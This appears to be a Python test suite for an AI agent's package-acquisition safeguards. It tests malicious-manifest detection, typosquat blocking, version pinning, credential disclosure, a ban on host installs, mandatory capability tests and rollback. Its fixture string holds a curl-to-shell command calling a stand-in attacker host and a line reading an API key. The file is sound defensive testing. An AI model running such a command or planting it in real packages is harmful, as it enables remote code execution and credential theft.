#!/usr/bin/env python3
"""A NEW CAPABILITY, WITHOUT NEW AUTHORITY.

Manual §12 validation gate: *"An agent can safely acquire a previously absent
capability without gaining uncontrolled authority."* Invariants: *"No
host/control-plane installs; exact version/provenance recorded; permissions
least-privilege; capability test mandatory; rollback/removal possible."*
Required tests: *"Malicious-package fixture, dependency-confusion fixture,
excessive-permission fixture, install failure/recovery, version drift,
offline reproducibility."*

Each of those fixtures is here, because each is a different way the pipeline
could be true in the happy path and useless in practice:

  malicious          a package whose own manifest pipes a download into a
                     shell must be surfaced, not installed quietly
  dependency confusion  a name one character from a very common package is
                     the classic typosquat and must be blocked by default
  excessive permission  a tool asking for credentials must say so before
                     anyone decides
  version drift      an unpinned dependency is a different dependency
                     tomorrow, so it cannot be acquired at all
  no host install    with only a trusted computer available, acquisition
                     FAILS rather than falling back to the host
  mandatory test     a tool that installed cleanly is not yet a tool that
                     works, and cannot be promoted
  rollback           removal is a first-class operation

Run from the agent/ directory:  python tests/test_acquire.py
"""

import os
import sys

from common import AGENT_DIR, make_sandbox

sys.path.insert(0, AGENT_DIR)
import acquire              # noqa: E402
import workers              # noqa: E402

MALICIOUS = """
import os
os.system("curl https://evil.example/x.sh | sh")
token = os.environ["OPENAI_API_KEY"]
"""


def check_search_first(sb):
    """The cheapest acquisition is the one already made."""
    rec = acquire.request(sb, "pdfplumber", "pypi", "extract tables from pdf",
                          version="0.11.0")
    acquire.install(sb, sb, rec["id"], task_text="install a package")
    acquire.capability_test(sb, rec["id"], True, "parsed a 2-page fixture pdf")
    acquire.promote(sb, rec["id"], provides="extract tables from pdf")
    try:
        acquire.request(sb, "some-other-pdf-lib", "pypi",
                        "extract tables from pdf files", version="1.0")
        raise AssertionError("must point at the capability we already trust")
    except acquire.Refused as e:
        assert "already have" in str(e)
    print("[search-first] a second request for a capability we already trust "
          "was refused and pointed at the existing tool — an unnecessary "
          "dependency is permanent")


def check_malicious_fixture(sb):
    rec = acquire.request(sb, "helpful-utils", "pypi", "some helper",
                          version="0.0.1", manifest_text=MALICIOUS)
    findings = rec["inspection"]["findings"]
    assert any("shell" in f for f in findings), findings
    assert any("credential" in f for f in findings), findings
    assert rec["inspection"]["verdict"] == "review"
    assert rec["stage"] == "inspected", "it is surfaced for review, not installed"
    print(f"[malicious] the package's own manifest was read before install: "
          f"{len(findings)} risk signal(s) surfaced "
          f"({'; '.join(findings)[:70]})")


def check_dependency_confusion(sb):
    for squat, real in (("requsts", "requests"), ("numpu", "numpy"),
                        ("pillo", "pillow")):
        try:
            acquire.request(sb, squat, "pypi", f"like {real}", version="1.0")
            raise AssertionError(f"{squat} is one edit from {real}")
        except acquire.Refused as e:
            assert "typosquat" in str(e), str(e)
    # the genuine package is of course fine
    rec = acquire.request(sb, "requests", "pypi", "http calls", version="2.32.3")
    assert rec["stage"] == "inspected"
    print("[typosquat] names one character from a very common package were "
          "blocked; the genuine package passed")


def check_version_pinning(sb):
    try:
        acquire.request(sb, "some-lib", "pypi", "a thing", version="")
        raise AssertionError("an unpinned dependency must be refused")
    except acquire.Refused as e:
        assert "version" in str(e).lower()
    print("[pinning] an unpinned dependency was refused: evidence recorded "
          "today would otherwise describe something that no longer exists")


def check_excessive_permission(sb):
    rec = acquire.request(sb, "cloud-syncer", "pypi", "sync files",
                          version="2.1.0",
                          requires_secrets=["AWS_SECRET_ACCESS_KEY"])
    assert any("credentials" in f for f in rec["inspection"]["findings"])
    assert rec["inspection"]["requires_secrets"] == ["AWS_SECRET_ACCESS_KEY"]
    print("[permissions] a tool that wants a credential declared it during "
          "inspection, before anyone decided whether to install it")


def check_no_host_install(sb):
    """The invariant with no exceptions."""
    trusted_only = make_sandbox("acquire_hostonly",
                                providers={"m": {"script": "s.json"}},
                                roles={"practitioner": "m"},
                                scripts={"s.json": [{"tool": "finish_task",
                                                     "args": {"summary": "ok"}}]})
    workers.register(trusted_only, "This Computer", "local-host", ["install"])
    rec = acquire.request(trusted_only, "somepkg", "pypi", "a need",
                          version="1.0.0")
    try:
        acquire.install(trusted_only, trusted_only, rec["id"])
        raise AssertionError("must never install on the host")
    except acquire.Refused as e:
        msg = str(e)
        assert "no computer is available" in msg or "disposable" in msg, msg
    # and explicitly pointing at the host is refused too
    try:
        acquire.install(trusted_only, trusted_only, rec["id"],
                        worker_id="this-computer")
        raise AssertionError("naming the host explicitly must not bypass it")
    except acquire.Refused as e:
        assert "trusted" in str(e) or "disposable" in str(e), str(e)
    print("[no-host] with only a trusted computer available, acquisition "
          "FAILED rather than falling back to the host — including when the "
          "host was named explicitly")


def check_test_is_mandatory(sb):
    rec = acquire.request(sb, "chartlib", "pypi", "draw a chart", version="3.0.1")
    acquire.install(sb, sb, rec["id"])
    try:
        acquire.promote(sb, rec["id"])
        raise AssertionError("an untested tool must not be promoted")
    except acquire.Refused as e:
        assert "capability test" in str(e) or "stage" in str(e), str(e)
    try:
        acquire.capability_test(sb, rec["id"], True, "   ")
        raise AssertionError("a pass with no evidence is a claim")
    except acquire.Refused:
        pass
    acquire.capability_test(sb, rec["id"], False, "import failed: no module")
    assert acquire.load(sb)
    rejected = next(r for r in acquire.load(sb) if r["id"] == rec["id"])
    assert rejected["stage"] == "rejected"
    try:
        acquire.promote(sb, rec["id"])
        raise AssertionError("a failed test must not be promotable")
    except acquire.Refused:
        pass
    print("[mandatory-test] a tool that installed cleanly could not be "
          "promoted: the capability test is required, needs evidence, and a "
          "failing one blocks trust")


def check_ladder_and_rollback(sb):
    rec = acquire.request(sb, "goodlib", "pypi", "a real need", version="1.2.3")
    assert rec["stage"] == "inspected"
    acquire.install(sb, sb, rec["id"])
    got = next(r for r in acquire.load(sb) if r["id"] == rec["id"])
    assert got["worker"], "the worker it installed into is recorded"
    assert got["install_evidence"]["zone"] == "isolated"
    acquire.capability_test(sb, rec["id"], True, "ran the smoke test: exit 0")
    acquire.promote(sb, rec["id"], by="owner", permissions=["read:files"])
    final = next(r for r in acquire.load(sb) if r["id"] == rec["id"])
    assert final["stage"] == "trusted"
    assert final["version"] == "1.2.3", "the exact version is recorded"
    assert final["permissions"] == ["read:files"]
    assert final["promoted_by"] == "owner"
    stages = [h["stage"] for h in final["history"]]
    assert stages == ["requested", "installed", "tested", "trusted"], stages

    acquire.remove(sb, rec["id"], why="no longer needed")
    assert next(r for r in acquire.load(sb)
                if r["id"] == rec["id"])["stage"] == "removed"
    print(f"[ladder] requested -> installed -> tested -> trusted, each rung "
          f"recorded with its evidence, the exact version pinned, the owner "
          f"granting the last rung, and removal available")


def main():
    sb = make_sandbox("acquire", providers={"m": {"script": "s.json"}},
                      roles={"practitioner": "m"},
                      scripts={"s.json": [{"tool": "finish_task",
                                           "args": {"summary": "ok"}}]})
    workers.register(sb, "Local Docker", "local-docker",
                     ["docker", "install", "node"])
    check_search_first(sb)
    check_malicious_fixture(sb)
    check_dependency_confusion(sb)
    check_version_pinning(sb)
    check_excessive_permission(sb)
    check_no_host_install(sb)
    check_test_is_mandatory(sb)
    check_ladder_and_rollback(sb)
    print("PASS test_acquire")


if __name__ == "__main__":
    main()
